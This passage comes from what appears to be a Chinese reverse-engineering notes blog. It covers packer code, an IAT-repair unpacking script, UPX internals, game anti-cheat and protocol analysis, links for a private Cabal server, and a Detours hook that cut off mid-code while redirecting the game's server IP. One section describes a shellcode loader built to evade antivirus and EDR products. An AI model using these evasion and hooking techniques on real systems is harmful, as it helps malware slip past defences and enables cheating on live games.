data-num="200"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="201"></td><td><pre> </pre></td></tr><tr><td data-num="202"></td><td><pre>DWORD <span class="token function">Align</span><span class="token punctuation">(</span>DWORD dwSize<span class="token punctuation">,</span> DWORD dwAlign<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="203"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="204"></td><td><pre>    <span class="token keyword">return</span> dwSize <span class="token operator">%</span> dwAlign <span class="token operator">?</span> dwSize <span class="token operator">+</span> dwAlign <span class="token operator">-</span> dwSize <span class="token operator">%</span> dwAlign <span class="token operator">:</span> dwSize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="205"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="206"></td><td><pre> </pre></td></tr><tr><td data-num="207"></td><td><pre>VOID <span class="token function">EncpyptFile</span><span class="token punctuation">(</span>PUCHAR pBaseAddr<span class="token punctuation">,</span> DWORD dwFileSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="208"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="209"></td><td><pre>    DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="210"></td><td><pre>    UCHAR uKey <span class="token operator">=</span> <span class="token number">190</span><span class="token punctuation">;</span>    <span class="token comment">// 加密密钥</span></pre></td></tr><tr><td data-num="211"></td><td><pre> </pre></td></tr><tr><td data-num="212"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwFileSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="213"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="214"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pBaseAddr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> pBaseAddr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> uKey<span class="token punctuation">)</span> pBaseAddr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> uKey<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="215"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="216"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="217"></td><td><pre> </pre></td></tr><tr><td data-num="218"></td><td><pre>VOID <span class="token function">ShowError</span><span class="token punctuation">(</span>PCHAR msg<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="219"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="220"></td><td><pre>    CHAR szError<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="221"></td><td><pre> </pre></td></tr><tr><td data-num="222"></td><td><pre>    <span class="token function">sprintf</span><span class="token punctuation">(</span>szError<span class="token punctuation">,</span> <span class="token string">"%s Error %d"</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="223"></td><td><pre>    <span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> szError<span class="token punctuation">,</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="224"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="225"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>code￼<span class="token number">75</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li>
</ol>
<p>/ 1. 定义变量<br>
 MOV dwOEP,0047148B<br>
MOV dwGetAPI,001E1914<br>
MOV dwWriteIAT,001E0897</p>
<p>// 2. 清除环境<br>
 BC    // 清除所有软件断点<br>
 BPHWC // 清除所有硬件断点<br>
 BPMC  // 清除内存断点</p>
<p>// 3. 设置断点<br>
 BPHWS dwOEP, “x” // 当执行到此地址时产生中断.<br>
BPHWS dwGetAPI, “x” // 当执行到此地址时产生中断.<br>
BPHWS dwWriteIAT, “x” // 当执行到此地址时产生中断.</p>
<p>// 4. 循环<br>
 LOOP0:<br>
RUN // F9<br>
CMP dwGetAPI,eip<br>
JNZ CASE1<br>
MOV dwTMP,eax<br>
JMP LOOP0<br>
CASE1:<br>
CMP dwWriteIAT,eip<br>
JNZ CASE2<br>
MOV [edx],dwTMP       //MOV DWORD PTR DS:[EDX],EAX<br>
JMP LOOP0<br>
CASE2:<br>
CMP dwOEP,eip<br>
JNZ LOOP0<br>
MSG “OEP 已到达”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 通过脱壳脚本之(修复IAT表)</span><br><span class="line"></span><br><span class="line">1. 生成加密的IAT函数大概步骤如下：</span><br><span class="line"></span><br><span class="line">2. 获取原始IAT函数地址，存放在一定位置</span><br><span class="line"></span><br><span class="line">3. 使用LoadLibraryA/W,GetProcAddress函数</span><br><span class="line"></span><br><span class="line">4. 申请空间，构造新的IAT函数</span><br><span class="line"></span><br><span class="line">5. 使用VirtualAlloc申请空间，拷贝代码</span><br><span class="line"></span><br><span class="line">6. 根据原始IAT函数地址计算加密值，隐藏真实地址</span><br><span class="line"></span><br><span class="line">7. 计算类似GetVersion函数中的代码中的x值</span><br><span class="line"></span><br><span class="line">8. sub edx,x;</span><br><span class="line"></span><br><span class="line">9. add ebc,x;</span><br><span class="line"></span><br><span class="line">10. 将新IAT函数地址写入IAT</span><br><span class="line"></span><br><span class="line">11. 填充地址到IAT</span><br><span class="line"></span><br><span class="line">12. 至此，我们已经知道程序在写入一个IAT函数地址时的操作过程，概括为以下步骤。</span><br><span class="line">     1.获取预先计算好的hash值</span><br><span class="line">     2.循环获取当前正在获取的模块中的导出函数名称，计算hash值，与预存的比较，如果失败继续循环获取</span><br><span class="line">     3.如果正确，获取导出函数的地址</span><br><span class="line">     4.拷贝预存的代码到缓冲区，将导出函数地址写入到缓冲区中</span><br><span class="line">     5.将缓冲区首地址写入IAT处，完成填充IAT的操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如何解密IAT？此处从函数地址入手，如果当我们获取了原始函数地址，且在写入IAT时，寄存器中还保存的是原始函数地址，那解密IAT就会变得很容易完成。如果代码是线性执行，我们只需改一下跳转应该就可以完成了，但是现在代码混淆度比较高，比较难找到规律，虽然说只要足够耐心，更改跳转应该可以实现，仔细跟踪代码，可以发现其实函数地址最初保存在EAX中，而后保存在EDX中，之后EDX被修改为IAT地址，EAX修改为加密的地址，在这个过程中，只要我们能做到EAX最后是函数地址即可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找向上跳的代码，即循环的代码，大概率是在循环解压原来的代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先要先在加壳后的程序中定位到原程序的入口点。使用 x64dbg 打开后直接运行一步，发现停在了 <code>pushad</code>  上。该指令将所有寄存器的值压栈，而在 UPX 的执行流程里，这一步之后会加载 UPX 的解压代码用于将原始程序解压。upx 的工作原理其实是这样的：首先将程序压缩。所谓的压缩包括两方面，一方面在程序的开头或者其他合适的地方插入一段代码，另一方面是将程序的其他地方做压缩。压缩也可以叫做加密，因为压缩后的程序比较难看懂，主要是和原来的代码有很大的不同。最大的表现也就是他的主要作用就是程序本身变小了。变小之后的程序在传输方面有很大的优势。其次就是在程序执行时，实时的对程序解压缩。解压缩功能是在第一步时插入的代码完成的功能。联起来就是：upx 可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。</p>
<p>upx 和普通的压缩，解压不同点就算在于 upx 是实时解压缩的。实时解压的原理可以使用一下图形表示：</p>
<p>graph LR;</p>
<p>1–&gt;2–&gt;3–&gt;4–&gt;5–&gt;6;</p>
<p>假设 1 是 upx 插入的代码，2，3，4 是压缩后的代码。5，6 是随便的什么东西。程序从 1 开始执行。而 1 的功能是将 2，3，4 解压缩为 7，8，9。7，8，9 就是 2，3，4 在压缩之前的形式。</p>
<p>1</p>
<p>2</p>
<p>graph LR;</p>
<p>1–&gt;7–&gt;8–&gt;9–&gt;5–&gt;6;</p>
<p>连起来就是：</p>
<p>1</p>
<p>2</p>
<p>3</p>
<p>4</p>
<p>5</p>
<p>6</p>
<p>graph LR;</p>
<p>1==&gt;2-.-&gt;3-.-&gt;4-.-&gt;5;</p>
<p>7==&gt;8==&gt;9==&gt;5==&gt;6;</p>
<p>2–&gt; 解密–&gt;7;</p>
<p>3–&gt; 解密–&gt;8;</p>
<p>4–&gt; 解密–&gt;9;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">跟壳的时候多用F7除非是往下一句跳的，F8会有触发暗桩程序跑飞的风险</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### shellcode免杀</span><br><span class="line"></span><br><span class="line">之前分析CS4的stage时，遂介绍之前所写shellcode框架，该框架的shellcode执行部分利用系统特性和直接系统调用（Direct System Call）执行，得以免杀主流杀软（火绒、360全部产品、毒霸等）,该方式也是主流绕过3环AV、EDR、沙箱的常用手段。</span><br><span class="line"></span><br><span class="line">-  该框架主要由四个项目组成：</span><br><span class="line">    GenerateShellCode：负责生成相关功能的shellcode。</span><br><span class="line">    EncryptShellCode：负责以AES128加密所将执行的shellcode。</span><br><span class="line">    FunctionHash：负责计算shell中所用到函数的hash值。</span><br><span class="line">    XShellCodeLoader：负责执行加密后的shellcode。</span><br><span class="line">-  shellcode脱壳之（GenerateShellCode原理）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 恶意软件脱壳之（MIR4手工脱壳）</span><br><span class="line"></span><br><span class="line">不是所有的壳都能通过F4中断，F2+F9 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 网络验证</span><br><span class="line"></span><br><span class="line">bp send</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bp GetPrivateProfileStringA     // 读配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过GetVersion判断壳有没有被解压，易语言通用。可以hook GetVersion</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 游戏外挂基础</span><br><span class="line"></span><br><span class="line">- 光子时代的新型反外挂（2016-2022）</span><br><span class="line"></span><br><span class="line">1. 动态检测游戏协议交互流量（登录，游戏关卡，地面环境，建筑物，技能，走路，副本，任务等）</span><br><span class="line">2. 后台机器学习（多模式场景匹配，智能AI大脑模拟）</span><br><span class="line">3. 全程无感知实时动态抓取场景</span><br><span class="line">4. 后台推送到手机APP或PC游戏登录大厅</span><br><span class="line">5. 场景建模外挂溯源自动化分析</span><br><span class="line">6. 游戏封号大数据检测模式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image-20231016154845700](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231016154845700.png) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>1.1.1 执行时间</p>
<p>当游戏被调试时，运行肯定会变慢，我们可以检测游戏主循环的运行时间，来判断是否被调试，实际上这种检测是最难拔出的</p>
<p>“暗桩”。</p>
<p>1.1.2 调试位检测<br>
 windows 提供了一些 api 来检测，例如 IsDebuggerPresent、CheckRemoteDebuggerPresent。<br>
// IsDebuggerPresentstatic bool xx_is_debug_1()<br>
{<br>
return IsDebuggerPresent();}// CheckRemoteDebuggerPresentstatic bool xx_is_debug_2()<br>
{<br>
BOOL debuged = false;<br>
bool ret =  CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;debuged);<br>
return ret &amp;&amp; TRUE == debuged;<br>
}</p>
<p>1.2 硬件断点检测<br>
硬件断点既是调试手段、也是一种 hook 手段，反外挂时一定要检测的。检测时有两种手段：<br>
1.GetThreadContext: 获取寄存器信息，判断 Dr0~Dr3 如果不是 0，则被下了硬件断点。<br>
2. 硬件断点占坑：硬件断点只有 4 个，反外挂系统把硬件断点占住，我只要检测我的断点存在即可。<br>
我使用了硬件断点占坑方式检测，因为调用 GetThreadContext 检测时容易被 hook。<br>
后期我们做对抗时，发现可以用设置内存属性，来绕过硬件断点占坑，以后会写一篇文章来介绍。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- #### 信息收集</span><br><span class="line"></span><br><span class="line">1. 信息收集是反外挂系统的重要组成部分，可以帮助我们收集玩家使用外挂证据、收集外挂等。</span><br><span class="line"></span><br><span class="line">2. 玩家监控：我们会重点监控“重点玩家”的信息，重点玩家来自于玩家举报，我们会加入监控观察一周。</span><br><span class="line"></span><br><span class="line">3. 游戏程序修改：反外挂系统会全量检测游戏.exe和d3d9.dll的代码段，发现修改就把版本和修改的地址上报，会定时分析其中可疑的味道。</span><br><span class="line"></span><br><span class="line">   没有D3D9游戏是跑不起来的。</span><br><span class="line"></span><br><span class="line">4. 文件上传：这个功能有点流氓，我们控制台可以指定上传玩家本地的文件，是我们收集外挂的重要手段。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1769d036135e4eb29d922bd5e5fa1c9a.png) </span><br><span class="line"></span><br><span class="line">协议分析是游戏漏洞挖掘的关键，确定游戏的协议是漏洞挖掘的前置条件。游戏客户端与服务器间通过事先定义的协议进行通信。只不过通信的数据往往被加密后，难以从信道上直接获取有效信息。弄清楚数据打包的过程，便是协议获取的关键。打个不恰当的比喻，在未学习其他语言基本知识时，我们很难听懂外国人对话的，此时了解了加密过程，就好比将他们的对话翻译成国语，了解了序列号过程，就好比知道了他们的断句，有了可读懂的语言，再加上断句，我们就能清楚的知道他们每一句话的意思。协议分析也是这个道理，其分析的关键便是弄清楚明文数据和序列化过程。。</span><br><span class="line"></span><br><span class="line">一般协议的明文buff分析，多从游戏的socket连接开始进行逆向分析，借助网络工具，可以清楚的了解到游戏使用的tcp/udp链接，然后针对性对send/sendto, recv/recvfrom下断点进行逆向。部分游戏因为自身的复杂性，可能会有多个socket连接，一般我们可以通过分析每一次数据交互过程，进一步确定游戏选择的是哪个socket进行数据传输。</span><br><span class="line"></span><br><span class="line">为更加清楚的说明协议分析的过程，笔者选取一款游戏进行说明。首先通过net-peeker发现游戏仅仅采用了TCP链接，OD附加后直接对send下断，发现游戏有多个调用地址调用了call，于是分析每一次send的参数，当在游戏内进行网络操作时，拦截</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TCP</span><br><span class="line"></span><br><span class="line">send/receive</span><br><span class="line"></span><br><span class="line">wsasend / wsarec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 游戏加载分析</span><br><span class="line"></span><br><span class="line">1.先对登录器传入命令行参数判断</span><br><span class="line"></span><br><span class="line">2.删除日志文件和敏感文件</span><br><span class="line"></span><br><span class="line">3.获取版本号信息</span><br><span class="line"></span><br><span class="line">4.对窗口名称做格式化</span><br><span class="line"></span><br><span class="line">5.注册窗口，设置回调</span><br><span class="line"></span><br><span class="line">6.读取bin文件</span><br><span class="line"></span><br><span class="line">7.读取资源文件</span><br><span class="line"></span><br><span class="line">8.创建游戏窗口</span><br><span class="line"></span><br><span class="line">9.调用消息循环</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cabal EP8 搭建</span><br><span class="line"></span><br><span class="line">[惊天动地EP8仿官方_2021最新一键端-游戏收藏-风帆资源站 (fengfan.mobi)](http://fengfan.mobi/post/392.html)</span><br><span class="line"></span><br><span class="line">[惊天动地EP8_2021单机_VBOX虚拟机版_免费高速下载|百度网盘-分享无限制 (baidu.com)](https://pan.baidu.com/s/18NNNWyB-WWBHuerxG-h5WA#list/path=%2Fsharelink1957418918-186929007833136%2F惊天动地EP8_2021单机_VBOX虚拟机版&amp;parentPath=%2Fsharelink1957418918-186929007833136)</span><br><span class="line"></span><br><span class="line">[架设◆ 惊天动地◆ 数据库、服务端、虚拟机、Linux、等方面疑问全面解答◆_惊天动地物品代码-CSDN博客](https://blog.csdn.net/xxuanwan/article/details/2989990)</span><br><span class="line"></span><br><span class="line">[端游《惊天动地EP8》VM一键端+视频教程+GM工具_免费高速下载|百度网盘-分享无限制 (baidu.com)](https://pan.baidu.com/s/1Bpj1Ee1T0TMEsHeZ9S64Gg?pwd=2xtb#list/path=%2Fsharelink3943911796-914199683682089%2F端游《惊天动地EP8》VM一键端%2B视频教程%2BGM工具%2F惊天动地EP8客户端&amp;parentPath=%2Fsharelink3943911796-914199683682089)</span><br><span class="line"></span><br><span class="line">[端游《惊天动地EP8》CABALEP8三变190版本 VM一键端+视频教程+GM工具-网游单机网-脚本王 (jiaobenwang.com)](https://jiaobenwang.com/6407.html)</span><br><span class="line"></span><br><span class="line">[[CentOS 7/8 Repack\] Full Cabal Server Installation + CentOS SQL (Database) [Updated 2023] | RaGEZONE - MMO Development Forums](https://forum.ragezone.com/threads/centos-7-8-repack-full-cabal-server-installation-centos-sql-database-updated-2023.1144251/)</span><br><span class="line"></span><br><span class="line">[【精选】CABAL_EP8_Centos7配置记录-CSDN博客](https://blog.csdn.net/weixin_43199687/article/details/121342818)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.通过栈回溯法找到命令行参数</span><br><span class="line"></span><br><span class="line">bp CreateProcessA  &amp;&amp; bp CreateProcessW</span><br><span class="line"></span><br><span class="line">找到调用的地方，依次执行到返回，直到出现命令行参数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0042890C    68 C9EC4100     push 单机登录.0041ECC9                       ; ASCII “\Main.exe f7a9q_1 &amp; exit”<br>
00428911    FF75 FC         push dword ptr ss:[ebp-0x4]<br>
 00428914    68 E2EC4100     push 单机登录.0041ECE2                       ; ASCII &quot;cmd /c @echo off &amp; start&quot;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">下次启动的时候就不需要调用启动器了，直接执行main即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.找到所连接的服务器IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>// bp ws2_32.connect<br>
004A81C6  |.  57                 push edi<br>
004A81C7  |.  FF75 08            push [arg.1]			// IP<br>
004A81CA  |.  33C0               xor eax,eax<br>
004A81CC  |.  8D7D F0            lea edi,[local.4]<br>
004A81CF  |.  AB                 stos dword ptr es:[edi]<br>
004A81D0  |.  AB                 stos dword ptr es:[edi]<br>
004A81D1  |.  AB                 stos dword ptr es:[edi]<br>
004A81D2  |.  AB                 stos dword ptr es:[edi]<br>
004A81D3  |.  66:C745 F0 0200    mov word ptr ss:[ebp-0x10],0x2<br>
004A81D9  |.  FF15 48660E01      call dword ptr ds:[0x10E6648]            ;  Main.011BD656</p>
<p>007B9E97   .  8D45 DC            lea eax,dword ptr ss:[ebp-0x24]<br>
007B9E9A   &gt;  8B0D 60010B01      mov ecx,dword ptr ds:[0x10B0160]<br>
007B9EA0   .  56                 push esi<br>
007B9EA1   .  50                 push eax<br>
007B9EA2   .  E8 102BC7FF        call Main.0042C9B7<br>
007B9EA7   .  85C0               test eax,eax</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231020155759692](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231020155759692.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.通过inline hook修改服务器IP</span><br><span class="line"></span><br><span class="line">```c++</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;shellapi.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &lt;iostream&gt;  </span><br><span class="line">#include &lt;winsvc.h&gt;</span><br><span class="line">#include &lt;string&gt;  </span><br><span class="line">#include &lt;io.h&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;Wininet.h&gt;</span><br><span class="line">#include &lt;comdef.h&gt;</span><br><span class="line">#include &lt;IPTypes.h&gt;</span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#include &quot;detours.h&quot;</span><br><span class="line">//#include &quot;KTools.h&quot;</span><br><span class="line">#pragma comment(lib, &quot;detours.lib&quot;)</span><br><span class="line">#pragma comment(lib, &quot;ws2_32.lib&quot;)  </span><br><span class="line">#pragma comment(lib, &quot;wldap32.lib&quot;) </span><br><span class="line">#pragma comment(lib,&quot;Wininet.lib&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char  ws2_32[0x100]=&#123;&quot;ws2_32.dll\0&quot;&#125;;</span><br><span class="line">HMODULE gHookws2_32;</span><br><span class="line">typedef int ( WINAPI * fun_connect)(SOCKET s, const struct sockaddr * name, int namelen);</span><br><span class="line"></span><br><span class="line">fun_connect Hookconnect;</span><br><span class="line"></span><br><span class="line">int WINAPI Myconnect(SOCKET s, const struct sockaddr * name, int namelen)</span><br><span class="line">&#123;</span><br><span class="line">	SOCKADDR_IN* addr =(SOCKADDR_IN*)name;</span><br><span class="line">	DWORD GameServerPort;</span><br><span class="line">	char GameServerIP[128]=&#123;0&#125;;</span><br><span class="line">	GameServerPort = ntohs(addr-&gt;sin_port);</span><br><span class="line">	strcpy(GameServerIP,inet_ntoa(addr-&gt;sin_addr));</span><br><span class="line">	//KTools::DbgPrintA(&quot;当前连接的IP：%s | 端口 %d \r\n&quot;,GameServerIP,GameServerPort);</span><br><span class="line">	if (stricmp(GameServerIP,&quot;192.168.56.200&quot;)==0 || stricmp(GameServerIP,&quot;192.168.56.201&quot;)==0)</span><br><span class="line">	&#123;</span><br><span class="line">		//KTools::DbgPrintA(&quot;[ GameServerIP == %s ] \r\n&quot;,GameServerIP);	</span><br><span class="line">		SOCKADDR_IN AddrSock;</span><br><span class="line">		